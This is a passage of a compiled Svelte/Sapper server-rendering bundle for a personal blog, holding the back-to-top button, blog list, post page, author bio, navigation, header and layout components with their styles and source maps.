	code: ".back-to-top.svelte-h76b9j{background-color:black;border:none;border-radius:50%;color:white;cursor:pointer;font-size:20px;line-height:48px;width:48px;position:fixed;bottom:30px;right:30px;z-index:100;opacity:1;transition:opacity 0.5s, visibility 0.5s;transform:translateY(0px)}.back-to-top.hidden.svelte-h76b9j{opacity:0;transform:translateY(0)\n    }.back-to-top.svelte-h76b9j:hover{background:#43c1e7}",
	map: "{\"version\":3,\"file\":\"BackToTop.svelte\",\"sources\":[\"BackToTop.svelte\"],\"sourcesContent\":[\"<script>\\n    import Fa from 'svelte-fa'\\n    import { faArrowUp } from '@fortawesome/free-solid-svg-icons'\\n\\n    export let showOnPx = 450;\\n    let hidden = true;\\n\\n    function goTop() {\\n        document.body.scrollIntoView();\\n    }\\n\\n    function scrollContainer() {\\n        return document.documentElement || document.body;\\n    }\\n\\n    function handleOnScroll() {\\n        if (!scrollContainer()) {\\n            return;\\n        }\\n\\n        if (scrollContainer().scrollTop > showOnPx) {\\n            hidden = false;\\n        } else {\\n            hidden = true;\\n        }\\n    }\\n</script>\\n\\n<style>\\n    .back-to-top {\\n        /* opacity: 1;\\n        transition: opacity 0.5s, visibility 0.5s;\\n        position: fixed;\\n        z-index: 99;\\n        right: 20px;\\n        user-select: none;\\n        bottom: 20px;\\n        color: white;\\n        background-color: black; */\\n\\n        background-color: black;\\n        border: none;\\n        border-radius: 50%;\\n        color: white;\\n        cursor: pointer;\\n        font-size: 20px;\\n        line-height: 48px;\\n        width: 48px;\\n        position: fixed;\\n        bottom: 30px;\\n        right: 30px;\\n        z-index: 100;\\n        /* opacity: 0; */\\n        opacity: 1;\\n        transition: opacity 0.5s, visibility 0.5s;\\n        transform: translateY(0px);\\n        /* transition: all .5s ease */\\n    }\\n\\n    .back-to-top.hidden {\\n        opacity: 0;\\n        /* visibility: hidden;\\n        opacity: 1; */\\n        transform: translateY(0)\\n    }\\n\\n    .back-to-top:hover {\\n        background: #43c1e7;\\n    }\\n</style>\\n\\n<svelte:window on:scroll={handleOnScroll} />\\n\\n<button class=\\\"back-to-top\\\" on:click={goTop} class:hidden>\\n    <Fa icon={faArrowUp} size=\\\"lg\\\" />\\n</button>\"],\"names\":[],\"mappings\":\"AA6BI,YAAY,cAAC,CAAC,AAWV,gBAAgB,CAAE,KAAK,CACvB,MAAM,CAAE,IAAI,CACZ,aAAa,CAAE,GAAG,CAClB,KAAK,CAAE,KAAK,CACZ,MAAM,CAAE,OAAO,CACf,SAAS,CAAE,IAAI,CACf,WAAW,CAAE,IAAI,CACjB,KAAK,CAAE,IAAI,CACX,QAAQ,CAAE,KAAK,CACf,MAAM,CAAE,IAAI,CACZ,KAAK,CAAE,IAAI,CACX,OAAO,CAAE,GAAG,CAEZ,OAAO,CAAE,CAAC,CACV,UAAU,CAAE,OAAO,CAAC,IAAI,CAAC,CAAC,UAAU,CAAC,IAAI,CACzC,SAAS,CAAE,WAAW,GAAG,CAAC,AAE9B,CAAC,AAED,YAAY,OAAO,cAAC,CAAC,AACjB,OAAO,CAAE,CAAC,CAGV,SAAS,CAAE,WAAW,CAAC,CAAC;IAC5B,CAAC,AAED,0BAAY,MAAM,AAAC,CAAC,AAChB,UAAU,CAAE,OAAO,AACvB,CAAC\"}"
};

const BackToTop = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	

    let { showOnPx = 450 } = $$props;

	if ($$props.showOnPx === void 0 && $$bindings.showOnPx && showOnPx !== void 0) $$bindings.showOnPx(showOnPx);

	$$result.css.add(css$2);

	return `

	<button class="${[`back-to-top svelte-h76b9j`,  "hidden" ].join(' ').trim() }">
	    ${validate_component(Fa, 'Fa').$$render($$result, { icon: freeSolidSvgIcons.faArrowUp, size: "lg" }, {}, {})}
	</button>`;
});

/* src/routes/blog/index.svelte generated by Svelte v3.5.0 */

const css$3 = {
	code: "h2.svelte-ffk8g2,.post-item-footer.svelte-ffk8g2{font-family:Rubik, sans-serif;font-weight:700}.post-item-date.svelte-ffk8g2{color:#AAA;text-align:left;text-transform:uppercase;margin-right:16px}hr.svelte-ffk8g2{margin:60px auto}",
	map: "{\"version\":3,\"file\":\"index.svelte\",\"sources\":[\"index.svelte\"],\"sourcesContent\":[\"<script context=\\\"module\\\">\\n  export function preload({ params, query }) {\\n    return this.fetch(`blog.json`).then(r => r.json()).then(posts => {\\n      return { posts };\\n    });\\n  }\\n</script>\\n\\n<script>\\n  export let posts;\\n  import BackToTop from \\\"./BackToTop.svelte\\\";\\n</script>\\n\\n<style>\\n  h2,\\n  .post-item-footer {\\n    font-family: Rubik, sans-serif;\\n    font-weight: 700;\\n  }\\n\\n  .post-item-date {\\n    color: #AAA;\\n    text-align: left;\\n    text-transform: uppercase;\\n    margin-right: 16px;\\n  }\\n\\n  hr {\\n    margin: 60px auto;\\n  }\\n</style>\\n\\n<svelte:head>\\n  <title>Blog</title>\\n</svelte:head>\\n\\n<div class=\\\"container\\\">\\n  <h1>Blog</h1>\\n  {#each posts as post, index}\\n  {#if index}\\n  <hr />\\n  {/if}\\n  <div class=\\\"post-item\\\">\\n    <h2>\\n      <a rel='prefetch' href='blog/{post.slug}'>{post.title}</a>\\n    </h2>\\n    <p>{post.excerpt}</p>\\n    <div class=\\\"post-item-footer\\\">\\n      <span class=\\\"post-item-date\\\">— {post.printDate}</span>\\n    </div>\\n  </div>\\n  {/each}\\n  <BackToTop />\\n</div>\"],\"names\":[],\"mappings\":\"AAcE,gBAAE,CACF,iBAAiB,cAAC,CAAC,AACjB,WAAW,CAAE,KAAK,CAAC,CAAC,UAAU,CAC9B,WAAW,CAAE,GAAG,AAClB,CAAC,AAED,eAAe,cAAC,CAAC,AACf,KAAK,CAAE,IAAI,CACX,UAAU,CAAE,IAAI,CAChB,cAAc,CAAE,SAAS,CACzB,YAAY,CAAE,IAAI,AACpB,CAAC,AAED,EAAE,cAAC,CAAC,AACF,MAAM,CAAE,IAAI,CAAC,IAAI,AACnB,CAAC\"}"
};

function preload({ params, query }) {
  return this.fetch(`blog.json`).then(r => r.json()).then(posts => {
    return { posts };
  });
}

const Index$1 = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { posts } = $$props;

	if ($$props.posts === void 0 && $$bindings.posts && posts !== void 0) $$bindings.posts(posts);

	$$result.css.add(css$3);

	return `${($$result.head += `<title>Blog</title>`, "")}

	<div class="container">
	  <h1>Blog</h1>
	  ${each(posts, (post, index) => `${ index ? `<hr class="svelte-ffk8g2">` : `` }
	  <div class="post-item">
	    <h2 class="svelte-ffk8g2">
	      <a rel="prefetch" href="blog/${escape(post.slug)}">${escape(post.title)}</a>
	    </h2>
	    <p>${escape(post.excerpt)}</p>
	    <div class="post-item-footer svelte-ffk8g2">
	      <span class="post-item-date svelte-ffk8g2">— ${escape(post.printDate)}</span>
	    </div>
	  </div>`)}
	  ${validate_component(BackToTop, 'BackToTop').$$render($$result, {}, {}, {})}
	</div>`;
});

/* src/components/Bio.svelte generated by Svelte v3.5.0 */

const css$4 = {
	code: "div.svelte-1b2y202{align-items:center;display:flex}img.svelte-1b2y202{width:180px;height:180px;border-radius:100px;border:3px solid #63d9fd;display:block;margin-right:15px}img.svelte-1b2y202:hover{border:3px solid #a0e9ff}p.svelte-1b2y202{font-size:1.125rem}",
	map: "{\"version\":3,\"file\":\"Bio.svelte\",\"sources\":[\"Bio.svelte\"],\"sourcesContent\":[\"<style>\\n  div {\\n    align-items: center;\\n    display: flex;\\n  }\\n\\n  img {\\n    width: 180px;\\n    height: 180px;\\n    border-radius: 100px;\\n    border: 3px solid #63d9fd;\\n    display: block;\\n    margin-right: 15px;\\n  }\\n\\n  img:hover {\\n    border: 3px solid #a0e9ff;\\n  }\\n\\n  p {\\n    font-size: 1.125rem;\\n  }\\n</style>\\n\\n<div>\\n  <img src=\\\"profile-pic.png\\\" alt=\\\"Anubhavsingh Sawdagur\\\">\\n  <p>\\n    Hi, I'm <strong class=\\\"highlight\\\">Anubhav</strong>. I'm an Ethical Hacker, Software Engineer and Network Engineer\\n    from Mauritius.\\n    <br />\\n    You can find me on <a href=\\\"https://www.instagram.com/_anu_bhav_/\\\" target=\\\"_blank\\\">Instagram</a>,\\n    <a href=\\\"https://www.twitter.com/0_Pr0t0typ3/\\\" target=\\\"_blank\\\">Twitter</a>,\\n    <a href=\\\"https://www.facebook.com/anubhav.s.0809/\\\" target=\\\"_blank\\\">Facebook</a> or\\n    <a href=\\\"https://www.linkedin.com/in/anubhavsingh-sawdagur/\\\" target=\\\"_blank\\\">LinkedIn</a>.\\n    See more of my work on <a href=\\\"https://github.com/Anu-bhav?tab=repositories\\\" target=\\\"_blank\\\">GitHub</a> or\\n    read about me on my <a href=\\\"https://anubhav.xyz/\\\" target=\\\"_blank\\\">Website</a>\\n  </p>\\n</div>\"],\"names\":[],\"mappings\":\"AACE,GAAG,eAAC,CAAC,AACH,WAAW,CAAE,MAAM,CACnB,OAAO,CAAE,IAAI,AACf,CAAC,AAED,GAAG,eAAC,CAAC,AACH,KAAK,CAAE,KAAK,CACZ,MAAM,CAAE,KAAK,CACb,aAAa,CAAE,KAAK,CACpB,MAAM,CAAE,GAAG,CAAC,KAAK,CAAC,OAAO,CACzB,OAAO,CAAE,KAAK,CACd,YAAY,CAAE,IAAI,AACpB,CAAC,AAED,kBAAG,MAAM,AAAC,CAAC,AACT,MAAM,CAAE,GAAG,CAAC,KAAK,CAAC,OAAO,AAC3B,CAAC,AAED,CAAC,eAAC,CAAC,AACD,SAAS,CAAE,QAAQ,AACrB,CAAC\"}"
};

const Bio = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	$$result.css.add(css$4);

	return `<div class="svelte-1b2y202">
	  <img src="profile-pic.png" alt="Anubhavsingh Sawdagur" class="svelte-1b2y202">
	  <p class="svelte-1b2y202">
	    Hi, I'm <strong class="highlight">Anubhav</strong>. I'm an Ethical Hacker, Software Engineer and Network Engineer
	    from Mauritius.
	    <br>
	    You can find me on <a href="https://www.instagram.com/_anu_bhav_/" target="_blank">Instagram</a>,
	    <a href="https://www.twitter.com/0_Pr0t0typ3/" target="_blank">Twitter</a>,
	    <a href="https://www.facebook.com/anubhav.s.0809/" target="_blank">Facebook</a> or
	    <a href="https://www.linkedin.com/in/anubhavsingh-sawdagur/" target="_blank">LinkedIn</a>.
	    See more of my work on <a href="https://github.com/Anu-bhav?tab=repositories" target="_blank">GitHub</a> or
	    read about me on my <a href="https://anubhav.xyz/" target="_blank">Website</a>
	  </p>
	</div>`;
});

/* src/routes/blog/[slug].svelte generated by Svelte v3.5.0 */

const css$5 = {
	code: "header.svelte-ww3xvk{text-align:center}header.svelte-ww3xvk h1.svelte-ww3xvk{margin-bottom:0.7em}header.svelte-ww3xvk p.svelte-ww3xvk{color:#AAA;text-transform:uppercase;font-family:Rubik, sans-serif;font-weight:600}header.svelte-ww3xvk hr.svelte-ww3xvk{min-width:100px;width:30%}#pdf_link.svelte-ww3xvk{color:#fff;background-color:#333;border-radius:5px;padding:8px;border:none}",
	map: "{\"version\":3,\"file\":\"[slug].svelte\",\"sources\":[\"[slug].svelte\"],\"sourcesContent\":[\"<script context=\\\"module\\\">\\n  export async function preload({ params, query }) {\\n    // the `slug` parameter is available because\\n    // this file is called [slug].html\\n    const res = await this.fetch(`blog/${params.slug}.json`);\\n    const data = await res.json();\\n    let pdf_location = \\\"pdf/\\\" + params.slug + \\\".pdf\\\";\\n    let pdf_res = await this.fetch(pdf_location);\\n    let has_pdf = true;\\n\\n    if (pdf_res.status === 404) {\\n      pdf_location = \\\"#\\\";\\n      has_pdf = false;\\n    }\\n\\n    if (res.status === 200) {\\n      return { pdf_location, has_pdf, post: data };\\n    } else {\\n      this.error(res.status, data.message);\\n    }\\n  }\\n\\n</script>\\n\\n<script>\\n  import Bio from '../../components/Bio.svelte';\\n  import BackToTop from \\\"./BackToTop.svelte\\\";\\n  export let post, pdf_location, has_pdf\\n</script>\\n\\n<style>\\n  header {\\n    text-align: center;\\n  }\\n\\n  header h1 {\\n    margin-bottom: 0.7em;\\n  }\\n\\n  header p {\\n    color: #AAA;\\n    text-transform: uppercase;\\n    font-family: Rubik, sans-serif;\\n    font-weight: 600;\\n  }\\n\\n  header hr {\\n    min-width: 100px;\\n    width: 30%;\\n  }\\n\\n  #pdf_link {\\n    color: #fff;\\n    background-color: #333;\\n    border-radius: 5px;\\n    padding: 8px;\\n    border: none;\\n  }\\n</style>\\n\\n<svelte:head>\\n  <title>{post.title}</title>\\n  <!--  Include canonical links to your blog -->\\n  <!--   <link rel=\\\"canonical\\\" href=\\\"\\\" /> -->\\n\\n  <!-- Validate your twitter card with https://cards-dev.twitter.com/validator  -->\\n  <!-- Update content properties with your URL   -->\\n  <!-- \\t<meta property=\\\"og:url\\\" content=\\\"\\\"} /> -->\\n  <meta property=\\\"og:type\\\" content=\\\"article\\\" />\\n  <meta property=\\\"og:title\\\" content={post.title} />\\n  <meta name=\\\"Description\\\" content={post.excerpt} />\\n  <meta property=\\\"og:description\\\" content={post.excerpt} />\\n\\n  <!--  Link to your preferred image  -->\\n  <!-- \\t<meta property=\\\"og:image\\\" content=\\\"\\\" /> -->\\n\\n  <meta name=\\\"twitter:card\\\" content=\\\"summary_large_image\\\" />\\n\\n  <!--  Link to your Domain  -->\\n  <!-- \\t<meta name=\\\"twitter:domain\\\" value=\\\"\\\" /> -->\\n\\n  <!--  Link to your Twitter Account  -->\\n  <!-- \\t<meta name=\\\"twitter:creator\\\" value=\\\"\\\" /> -->\\n\\n  <meta name=\\\"twitter:title\\\" value={post.title} />\\n  <meta name=\\\"twitter:description\\\" content={post.excerpt} />\\n\\n  <!--  Link to your preferred image to be displayed on Twitter (832x520px) -->\\n  <!-- \\t<meta name=\\\"twitter:image\\\" content=\\\"\\\" /> -->\\n\\n  <meta name=\\\"twitter:label1\\\" value=\\\"Published on\\\" />\\n  <meta name=\\\"twitter:data1\\\" value={new Date(post.printDate).toLocaleDateString(undefined, { year: 'numeric' ,\\n    month: 'short' , day: 'numeric' })} />\\n  <meta name=\\\"twitter:label2\\\" value=\\\"Reading Time\\\" />\\n  <meta name=\\\"twitter:data2\\\" value={post.printReadingTime} />\\n</svelte:head>\\n\\n<header>\\n  <p>{post.printDate} ~ {post.printReadingTime}</p>\\n  <h1>{post.title}</h1>\\n  {#if has_pdf}\\n  <a id=\\\"pdf_link\\\" target=\\\"_blank\\\" rel=\\\"nofollow\\\" href=\\\"{pdf_location}\\\">View As PDF</a>\\n  {/if}\\n  <hr />\\n</header>\\n<div class=\\\"container\\\">\\n  <article class=\\\"content\\\">\\n    {@html post.html}\\n  </article>\\n  <hr />\\n  <BackToTop />\\n  <Bio />\\n</div>\"],\"names\":[],\"mappings\":\"AA+BE,MAAM,cAAC,CAAC,AACN,UAAU,CAAE,MAAM,AACpB,CAAC,AAED,oBAAM,CAAC,EAAE,cAAC,CAAC,AACT,aAAa,CAAE,KAAK,AACtB,CAAC,AAED,oBAAM,CAAC,CAAC,cAAC,CAAC,AACR,KAAK,CAAE,IAAI,CACX,cAAc,CAAE,SAAS,CACzB,WAAW,CAAE,KAAK,CAAC,CAAC,UAAU,CAC9B,WAAW,CAAE,GAAG,AAClB,CAAC,AAED,oBAAM,CAAC,EAAE,cAAC,CAAC,AACT,SAAS,CAAE,KAAK,CAChB,KAAK,CAAE,GAAG,AACZ,CAAC,AAED,SAAS,cAAC,CAAC,AACT,KAAK,CAAE,IAAI,CACX,gBAAgB,CAAE,IAAI,CACtB,aAAa,CAAE,GAAG,CAClB,OAAO,CAAE,GAAG,CACZ,MAAM,CAAE,IAAI,AACd,CAAC\"}"
};

async function preload$1({ params, query }) {
  // the `slug` parameter is available because
  // this file is called [slug].html
  const res = await this.fetch(`blog/${params.slug}.json`);
  const data = await res.json();
  let pdf_location = "pdf/" + params.slug + ".pdf";
  let pdf_res = await this.fetch(pdf_location);
  let has_pdf = true;

  if (pdf_res.status === 404) {
    pdf_location = "#";
    has_pdf = false;
  }

  if (res.status === 200) {
    return { pdf_location, has_pdf, post: data };
  } else {
    this.error(res.status, data.message);
  }
}

const Slug = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	
  let { post, pdf_location, has_pdf } = $$props;

	if ($$props.post === void 0 && $$bindings.post && post !== void 0) $$bindings.post(post);
	if ($$props.pdf_location === void 0 && $$bindings.pdf_location && pdf_location !== void 0) $$bindings.pdf_location(pdf_location);
	if ($$props.has_pdf === void 0 && $$bindings.has_pdf && has_pdf !== void 0) $$bindings.has_pdf(has_pdf);

	$$result.css.add(css$5);

	return `${($$result.head += `<title>${escape(post.title)}</title><meta property="og:type" content="article"><meta property="og:title"${(v => v == null ? "" : ` content="${escape(post.title)}"`)(post.title)}><meta name="Description"${(v => v == null ? "" : ` content="${escape(post.excerpt)}"`)(post.excerpt)}><meta property="og:description"${(v => v == null ? "" : ` content="${escape(post.excerpt)}"`)(post.excerpt)}><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title"${(v => v == null ? "" : ` value="${escape(post.title)}"`)(post.title)}><meta name="twitter:description"${(v => v == null ? "" : ` content="${escape(post.excerpt)}"`)(post.excerpt)}><meta name="twitter:label1" value="Published on"><meta name="twitter:data1"${(v => v == null ? "" : ` value="${escape(new Date(post.printDate).toLocaleDateString(undefined, { year: 'numeric' ,
    month: 'short' , day: 'numeric' }))}"`)(new Date(post.printDate).toLocaleDateString(undefined, { year: 'numeric' ,
    month: 'short' , day: 'numeric' }))}><meta name="twitter:label2" value="Reading Time"><meta name="twitter:data2"${(v => v == null ? "" : ` value="${escape(post.printReadingTime)}"`)(post.printReadingTime)}>`, "")}

	<header class="svelte-ww3xvk">
	  <p class="svelte-ww3xvk">${escape(post.printDate)} ~ ${escape(post.printReadingTime)}</p>
	  <h1 class="svelte-ww3xvk">${escape(post.title)}</h1>
	  ${ has_pdf ? `<a id="pdf_link" target="_blank" rel="nofollow"${(v => v == null ? "" : ` href="${escape(pdf_location)}"`)(pdf_location)} class="svelte-ww3xvk">View As PDF</a>` : `` }
	  <hr class="svelte-ww3xvk">
	</header>
	<div class="container">
	  <article class="content">
	    ${post.html}
	  </article>
	  <hr>
	  ${validate_component(BackToTop, 'BackToTop').$$render($$result, {}, {}, {})}
	  ${validate_component(Bio, 'Bio').$$render($$result, {}, {}, {})}
	</div>`;
});

/* src/components/Logo.svelte generated by Svelte v3.5.0 */

const css$6 = {
	code: "img.svelte-1u41owj{display:block;height:75px;width:75px}",
	map: "{\"version\":3,\"file\":\"Logo.svelte\",\"sources\":[\"Logo.svelte\"],\"sourcesContent\":[\"<style>\\n  img {\\n    display: block;\\n    height: 75px;\\n    width: 75px;\\n  }\\n</style>\\n\\n<a href=\\\"/\\\">\\n  <img alt=\\\"Sapper\\\" src='as-logo2.ico'>\\n</a>\\n\"],\"names\":[],\"mappings\":\"AACE,GAAG,eAAC,CAAC,AACH,OAAO,CAAE,KAAK,CACd,MAAM,CAAE,IAAI,CACZ,KAAK,CAAE,IAAI,AACb,CAAC\"}"
};

const Logo = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	$$result.css.add(css$6);

	return `<a href="/">
	  <img alt="Sapper" src="as-logo2.ico" class="svelte-1u41owj">
	</a>`;
});

/* src/components/Nav.svelte generated by Svelte v3.5.0 */

const css$7 = {
	code: "nav.svelte-16qpxtx{align-items:flex-end;display:flex;flex:1;font-family:Rubik, sans-serif;font-weight:700;justify-content:center;text-transform:uppercase;line-height:75px}a.svelte-16qpxtx{color:inherit;text-decoration:none;padding:10px 5px;display:block;position:relative;margin-left:20px}a.svelte-16qpxtx:not(.selected){opacity:0.7}a.svelte-16qpxtx::before{content:'';position:absolute;transition:transform .3s ease;left:0;bottom:25px;width:100%;height:2px;background:#AAA;transform:scaleX(0)}a.svelte-16qpxtx:hover::before,.selected.svelte-16qpxtx::before{transform:scaleX(1)}.selected.svelte-16qpxtx::before{background:#43c1e7}",
	map: "{\"version\":3,\"file\":\"Nav.svelte\",\"sources\":[\"Nav.svelte\"],\"sourcesContent\":[\"<script>\\n  export let segment;\\n</script>\\n\\n<style>\\n  nav {\\n    align-items: flex-end;\\n    display: flex;\\n    flex: 1;\\n    font-family: Rubik, sans-serif;\\n    font-weight: 700;\\n    justify-content: center;\\n    text-transform: uppercase;\\n    line-height: 75px;\\n  }\\n\\n  a {\\n    color: inherit;\\n    text-decoration: none;\\n    padding: 10px 5px;\\n    display: block;\\n    position: relative;\\n    margin-left: 20px;\\n  }\\n\\n  a:not(.selected) {\\n    opacity: 0.7;\\n  }\\n\\n  a::before {\\n    content: '';\\n    position: absolute;\\n    transition: transform .3s ease;\\n    left: 0;\\n    bottom: 25px;\\n    width: 100%;\\n    height: 2px;\\n    background: #AAA;\\n    transform: scaleX(0);\\n  }\\n\\n  a:hover::before,\\n  .selected::before {\\n    transform: scaleX(1);\\n  }\\n\\n  .selected::before {\\n    background: #43c1e7;\\n  }\\n</style>\\n\\n<nav>\\n  <a class='{segment === undefined ? \\\"selected\\\" : \\\"\\\"}' href='.'>Home</a>\\n  <a rel=prefetch class='{segment === \\\"blog\\\" ? \\\"selected\\\" : \\\"\\\"}' href='blog'>Blog</a>\\n  <a class='{segment === \\\"website\\\" ? \\\"selected\\\" : \\\"\\\"}' href='https://anubhav.xyz'>Website</a>\\n</nav>\"],\"names\":[],\"mappings\":\"AAKE,GAAG,eAAC,CAAC,AACH,WAAW,CAAE,QAAQ,CACrB,OAAO,CAAE,IAAI,CACb,IAAI,CAAE,CAAC,CACP,WAAW,CAAE,KAAK,CAAC,CAAC,UAAU,CAC9B,WAAW,CAAE,GAAG,CAChB,eAAe,CAAE,MAAM,CACvB,cAAc,CAAE,SAAS,CACzB,WAAW,CAAE,IAAI,AACnB,CAAC,AAED,CAAC,eAAC,CAAC,AACD,KAAK,CAAE,OAAO,CACd,eAAe,CAAE,IAAI,CACrB,OAAO,CAAE,IAAI,CAAC,GAAG,CACjB,OAAO,CAAE,KAAK,CACd,QAAQ,CAAE,QAAQ,CAClB,WAAW,CAAE,IAAI,AACnB,CAAC,AAED,gBAAC,KAAK,SAAS,CAAC,AAAC,CAAC,AAChB,OAAO,CAAE,GAAG,AACd,CAAC,AAED,gBAAC,QAAQ,AAAC,CAAC,AACT,OAAO,CAAE,EAAE,CACX,QAAQ,CAAE,QAAQ,CAClB,UAAU,CAAE,SAAS,CAAC,GAAG,CAAC,IAAI,CAC9B,IAAI,CAAE,CAAC,CACP,MAAM,CAAE,IAAI,CACZ,KAAK,CAAE,IAAI,CACX,MAAM,CAAE,GAAG,CACX,UAAU,CAAE,IAAI,CAChB,SAAS,CAAE,OAAO,CAAC,CAAC,AACtB,CAAC,AAED,gBAAC,MAAM,QAAQ,CACf,wBAAS,QAAQ,AAAC,CAAC,AACjB,SAAS,CAAE,OAAO,CAAC,CAAC,AACtB,CAAC,AAED,wBAAS,QAAQ,AAAC,CAAC,AACjB,UAAU,CAAE,OAAO,AACrB,CAAC\"}"
};

const Nav = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { segment } = $$props;

	if ($$props.segment === void 0 && $$bindings.segment && segment !== void 0) $$bindings.segment(segment);

	$$result.css.add(css$7);

	return `<nav class="svelte-16qpxtx">
	  <a class="${escape(segment === undefined ? "selected" : "")} svelte-16qpxtx" href=".">Home</a>
	  <a rel="prefetch" class="${escape(segment === "blog" ? "selected" : "")} svelte-16qpxtx" href="blog">Blog</a>
	  <a class="${escape(segment === "website" ? "selected" : "")} svelte-16qpxtx" href="https://anubhav.xyz">Website</a>
	</nav>`;
});

/* src/components/Header.svelte generated by Svelte v3.5.0 */

const css$8 = {
	code: "header.svelte-y9ah38{display:flex;margin:0 auto;max-width:1400px;padding:2em;width:100%}",
	map: "{\"version\":3,\"file\":\"Header.svelte\",\"sources\":[\"Header.svelte\"],\"sourcesContent\":[\"<script>\\n  import Logo from './Logo.svelte'\\n  import Nav from './Nav.svelte'\\n\\n  export let segment\\n</script>\\n\\n<style>\\n  header {\\n    display: flex;\\n    margin: 0 auto;\\n    max-width: 1400px;\\n    padding: 2em;\\n    width: 100%;\\n  }\\n</style>\\n\\n<header>\\n  <Logo />\\n  <Nav {segment} />\\n</header>\\n\"],\"names\":[],\"mappings\":\"AAQE,MAAM,cAAC,CAAC,AACN,OAAO,CAAE,IAAI,CACb,MAAM,CAAE,CAAC,CAAC,IAAI,CACd,SAAS,CAAE,MAAM,CACjB,OAAO,CAAE,GAAG,CACZ,KAAK,CAAE,IAAI,AACb,CAAC\"}"
};

const Header = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	

  let { segment } = $$props;

	if ($$props.segment === void 0 && $$bindings.segment && segment !== void 0) $$bindings.segment(segment);

	$$result.css.add(css$8);

	return `<header class="svelte-y9ah38">
	  ${validate_component(Logo, 'Logo').$$render($$result, {}, {}, {})}
	  ${validate_component(Nav, 'Nav').$$render($$result, { segment: segment }, {}, {})}
	</header>`;
});

/* src/routes/_layout.svelte generated by Svelte v3.5.0 */

const css$9 = {
	code: ".layout.svelte-v25qrq{display:flex;flex-direction:column;min-height:100%;min-height:100vh}main.svelte-v25qrq{flex:1;position:relative;margin:0 auto;max-width:1400px;background-color:white;padding:1em 2em;box-sizing:border-box;width:100%;display:flex;flex-direction:column}footer.svelte-v25qrq{color:#AAA;font-size:1em;font-family:Rubik, sans-serif;margin:1em auto;max-width:1400px;padding:1em 2em;text-align:center;width:100%}",
	map: "{\"version\":3,\"file\":\"_layout.svelte\",\"sources\":[\"_layout.svelte\"],\"sourcesContent\":[\"<script>\\n  import Header from '../components/Header.svelte';\\n\\n  export let segment;\\n</script>\\n\\n<style>\\n  .layout {\\n    display: flex;\\n    flex-direction: column;\\n    min-height: 100%;\\n    min-height: 100vh;\\n  }\\n\\n  main {\\n    flex: 1;\\n    position: relative;\\n    margin: 0 auto;\\n    max-width: 1400px;\\n    background-color: white;\\n    padding: 1em 2em;\\n    box-sizing: border-box;\\n    width: 100%;\\n    display: flex;\\n    flex-direction: column;\\n  }\\n\\n  footer {\\n    color: #AAA;\\n    font-size: 1em;\\n    font-family: Rubik, sans-serif;\\n    margin: 1em auto;\\n    max-width: 1400px;\\n    padding: 1em 2em;\\n    text-align: center;\\n    width: 100%;\\n  }\\n</style>\\n\\n<div class=\\\"layout\\\">\\n  <Header {segment}/>\\n\\n  <main>\\n    <slot></slot>\\n  </main>\\n\\n  <footer>\\n    <span>\\n      &copy; {new Date().getFullYear()} Personal Blog.\\n      Powered by <a href=\\\"https://sapper.svelte.dev\\\" target=\\\"_blank\\\">Sapper</a>.\\n      Template by <a href=\\\"https://anubhav.xyz\\\" target=\\\"_blank\\\">Anubhavsingh Sawdagur</a>.\\n    </span>\\n  </footer>\\n</div>\\n\"],\"names\":[],\"mappings\":\"AAOE,OAAO,cAAC,CAAC,AACP,OAAO,CAAE,IAAI,CACb,cAAc,CAAE,MAAM,CACtB,UAAU,CAAE,IAAI,CAChB,UAAU,CAAE,KAAK,AACnB,CAAC,AAED,IAAI,cAAC,CAAC,AACJ,IAAI,CAAE,CAAC,CACP,QAAQ,CAAE,QAAQ,CAClB,MAAM,CAAE,CAAC,CAAC,IAAI,CACd,SAAS,CAAE,MAAM,CACjB,gBAAgB,CAAE,KAAK,CACvB,OAAO,CAAE,GAAG,CAAC,GAAG,CAChB,UAAU,CAAE,UAAU,CACtB,KAAK,CAAE,IAAI,CACX,OAAO,CAAE,IAAI,CACb,cAAc,CAAE,MAAM,AACxB,CAAC,AAED,MAAM,cAAC,CAAC,AACN,KAAK,CAAE,IAAI,CACX,SAAS,CAAE,GAAG,CACd,WAAW,CAAE,KAAK,CAAC,CAAC,UAAU,CAC9B,MAAM,CAAE,GAAG,CAAC,IAAI,CAChB,SAAS,CAAE,MAAM,CACjB,OAAO,CAAE,GAAG,CAAC,GAAG,CAChB,UAAU,CAAE,MAAM,CAClB,KAAK,CAAE,IAAI,AACb,CAAC\"}"
};

const Layout = create_ssr_component(($$result, $$props, $$bindings, $$slots) => {
	let { segment } = $$props;

	if ($$props.segment === void 0 && $$bindings.segment && segment !== void 0) $$bindings.segment(segment);

	$$result.css.add(css$9);

	return `<div class="layout svelte-v25qrq">
	  ${validate_component(Header, 'Header').$$render($$result, { segment: segment }, {}, {})}

	  <main class="svelte-v25qrq">
	    ${$$slots.default ? $$slots.default() : ``}
	  </main>

	  <footer class="svelte-v25qrq">
	    <span>
	      © ${escape(new Date().getFullYear())} Personal Blog.
	      Powered by <a href="https://sapper.svelte.dev" target="_blank">Sapper</a>.
	      Template by <a href="https://anubhav.xyz" target="_blank">Anubhavsingh Sawdagur</a>.
	    </span>
	  </footer>
	</div>`;
});

/* src/routes/_error.svelte generated by Svelte v3.5.0 */

const css$a = {
	code: "h1.svelte-8od9u6,p.svelte-8od9u6{margin:0 auto}h1.svelte-8od9u6{font-size:2.8em;font-weight:700;margin:0 0 0.5em 0}p.svelte-8od9u6{margin:1em auto}@media(min-width: 480px){h1.svelte-8od9u6{font-size:4em}}",
